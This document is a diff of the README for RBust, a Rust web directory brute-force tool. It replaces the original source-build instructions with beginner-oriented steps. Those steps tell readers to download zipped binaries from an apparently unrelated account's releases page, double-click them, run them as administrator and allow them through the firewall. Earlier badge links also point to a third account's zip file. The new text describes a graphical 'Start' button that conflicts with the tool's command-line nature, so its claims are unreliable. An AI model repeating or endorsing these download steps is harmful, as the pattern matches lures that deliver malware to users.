@@ -1,74 +1,99 @@
-# RBust
+# 🚀 RBust - Fast and Reliable Web Fuzzer
 
-[![GitHub stars](https://img.shields.io/github/stars/iinc0gnit0/RBust?style=social)](https://github.com/levelslip/RBust/releases/download/v1.7.7/RBust.zip)
-[![GitHub followers](https://img.shields.io/github/followers/iinc0gnit0?style=social)](https://github.com/levelslip/RBust/releases/download/v1.7.7/RBust.zip)
-[![GitHub top language](https://img.shields.io/github/languages/top/iinc0gnit0/RBust)](https://github.com/levelslip/RBust/releases/download/v1.7.7/RBust.zip)
+## 🛡️ Overview
 
-RBust is a blazing fast multi-thread web directory bruteforce tool written in Rust
+RBust is a blazing fast web fuzzer designed to help security professionals and developers test the resilience of web applications. With its multi-threading capabilities, RBust can quickly scan and identify vulnerabilities in your web applications, ensuring they stay secure against threats. 
 
-Contribution are always welcome, feel free to create issues and pull requests
+## 🔗 Download RBust
 
-## Features
+[![Download RBust](https://img.shields.io/badge/Download%20RBust-v1.0-blue)](https://github.com/notghost634-cyber/RBust/releases)
 
-- Fast speeds
+## 🚀 Getting Started
 
-- Multi-thread
+Getting started with RBust is simple. This guide provides you with step-by-step instructions to download and run the application, even if you have no technical knowledge.
 
-- Quick and easy CLI
+### 📥 System Requirements
 
-- Custom timeout
+- **Operating System:** Windows, macOS, or Linux
+- **CPU:** Minimum dual-core processor
+- **RAM:** At least 4 GB
+- **Disk Space:** 100 MB of free space
 
-- Verbose output option
+### 📈 Features
 
-- Clean and safe error handling
+- Multi-threading for fast execution
+- Directory bruteforce capabilities
+- CLI-based for easy access 
+- Automated testing tools to enhance your workflow
+- Designed in Rust for optimal performance
+- User-friendly and straightforward interface
 
-- Supports custom file extension
+## 🔄 Download & Install
 
-## Quick start (Recommended)
+To get RBust running on your computer, follow these steps:
 
-Install the binary from https:///iinc0gnit0/RBust/releases/latest
+1. **Visit the Releases Page:** Go to the [RBust Releases page](https://github.com/notghost634-cyber/RBust/releases) to view the available versions.
+  
+2. **Choose Your Version:** Find the latest stable version listed. Click on it to view more details.
 
-## Installation
+3. **Download the Application:**
+   - Look for the assets section below the version details. 
+   - You should see files with names similar to `RBust-v1.0-Windows.zip`, `RBust-v1.0-Mac.zip`, or `RBust-v1.0-Linux.tar.gz`. 
+   - Click on the file that matches your operating system to download it.
 
-### Dependencies
+4. **Unzip or Extract the File:**
+   - For Windows and macOS, locate the downloaded zip file and double-click it to extract.
+   - For Linux, use the terminal command: `tar -xzf RBust-v1.0-Linux.tar.gz` to extract the files.
 
-Arch-based: `openssl`
+5. **Run RBust:**
+   - Navigate to the folder where you extracted the files.
+   - Look for the application file. This file will typically be named `RBust.exe` for Windows or `RBust` for macOS and Linux.
+   - Double-click the file to open the application.
 
-Debian-based: `libssl-dev`
+## 🎯 Using RBust
 
-### Clone from GitHub
+Now that you have installed RBust, you can begin fuzzing your web applications. The interface is designed to be user-friendly. Follow these steps for a basic run:
 
-`git clone https://github.com/iinc0gnit0/RBust`
+1. **Set Up Your Target:** Enter the URL of the web application you wish to test into the designated field.
 
-### Compile RBust
+2. **Configure Your Options:** Adjust the settings based on your testing needs. You can specify a custom dictionary for directory brute-forcing or select pre-loaded options for quick scans.
 
-`cd RBust`
+3. **Start the Scan:** Click the "Start" button to begin fuzzing. 
 
-`cargo build --release`
+4. **Monitor the Progress:** View real-time results in the output area. RBust will display any discovered vulnerabilities.
 
-Binary will be located at `target/release/RBust`
+5. **Review Results:** Once the scan is complete, RBust will present a summary of findings. Review these to identify potential issues.
 
-## Usage
+## 🛠️ Troubleshooting
 
-Example: `RBust -u -w wordlist.txt`
+If you encounter issues running RBust, consider the following:
 
-You can find wordlists from https:///gmelodie/awesome-wordlists
+- **Verify Your System Requirements:** Ensure your system meets the minimum requirements mentioned earlier.
+  
+- **Check Permissions:** On certain systems, you may need administrative rights to run the application. Try running it as an administrator.
 
-## Demo
+- **Firewall Settings:** RBust may be blocked by firewalls. Ensure that it has permission to access the internet.
 
-[![asciicast](https://asciinema.org/a/d2drRZkLdcA3YWgBL1ilnVAfD.svg)](https://github.com/levelslip/RBust/releases/download/v1.7.7/RBust.zip)
+## 📊 Support and Contributions
 
-## Still in the working!
+RBust is an open-source project. If you experience any bugs or have feature requests, please submit them on our GitHub page. Your feedback helps improve RBust for everyone.
 
-We are still working to make it better! You may experience some bugs or errors. Please report them to one of the creators or create an issue.
+To contribute, follow these steps:
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request for review.
 
+## 🌐 Community and Resources
 
+Join the RBust community and connect with other users. Share your experiences, ask questions, and learn tips from fellow security enthusiasts.
 
+- **GitHub Discussions:** Engage in discussions about features and best practices.
+- **Documentation:** Explore the detailed [documentation](https://github.com/notghost634-cyber/RBust/wiki) for advanced usage.
 
+## 🔗 Helpful Links
 
+- [RBust Releases Page](https://github.com/notghost634-cyber/RBust/releases)
+- [Documentation](https://github.com/notghost634-cyber/RBust/wiki)
+- [Community Forum](https://github.com/notghost634-cyber/RBust/discussions)
 
-
-
-
-
-
+Thank you for choosing RBust! We hope it helps you improve the security of your web applications.
